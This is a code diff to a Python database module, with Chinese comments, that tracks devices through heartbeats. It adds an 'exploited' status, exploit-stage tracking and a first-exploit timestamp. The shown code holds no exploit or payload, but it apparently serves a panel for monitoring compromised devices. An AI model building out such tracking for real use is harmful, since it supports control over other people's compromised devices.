@@ -21,12 +21,13 @@ def get_devices(db: Session, skip: int = 0, limit: int = 100) -> List[models.Dev
 
 
 def get_online_devices(db: Session) -> List[models.Device]:
-    """获取在线设备"""
-    threshold = datetime.utcnow() - timedelta(seconds=60)
+    """获取在线设备：最近 90 秒有心跳的 online/exploited"""
+    threshold = datetime.utcnow() - timedelta(seconds=90)
     return db.query(models.Device).filter(
-        models.Device.status == "online",
+        models.Device.status.in_(["online", "exploited"]),
         models.Device.last_seen >= threshold
     ).order_by(desc(models.Device.last_seen)).all()
+
 
 
 def create_device(db: Session, device: schemas.DeviceRegister, ip: str = None) -> models.Device:
@@ -86,25 +87,35 @@ def update_device_heartbeat(db: Session, heartbeat: schemas.DeviceHeartbeat) -> 
     device = get_device(db, heartbeat.device_uuid)
     if not device:
         return None
-    
-    device.status = heartbeat.status
+
+    # 已 exploited 不降级为 online；除非客户端显式 offline
+    new_status = heartbeat.status or "online"
+    if device.status == "exploited" and new_status == "online":
+        device.status = "exploited"
+    else:
+        device.status = new_status
     device.last_seen = datetime.utcnow()
     device.last_activity = datetime.utcnow()
-    
+
     if heartbeat.battery_level is not None:
         device.battery_level = heartbeat.battery_level
     if heartbeat.exploit_stage is not None:
         device.exploit_stage = heartbeat.exploit_stage
-        if heartbeat.exploit_stage == "completed" and not device.first_exploit_at:
+        if heartbeat.exploit_stage in ("completed", "exploited") and not device.first_exploit_at:
             device.first_exploit_at = datetime.utcnow()
+            device.status = "exploited"
     if heartbeat.extra:
         if not device.extra:
             device.extra = {}
-        device.extra.update(heartbeat.extra)
-    
+        # SQLAlchemy JSON 可能需重新赋值
+        extra = dict(device.extra or {})
+        extra.update(heartbeat.extra)
+        device.extra = extra
+
     db.commit()
     db.refresh(device)
     return device
+
 
 
 def update_device_status(db: Session, device_uuid: str, status: str) -> Optional[models.Device]:
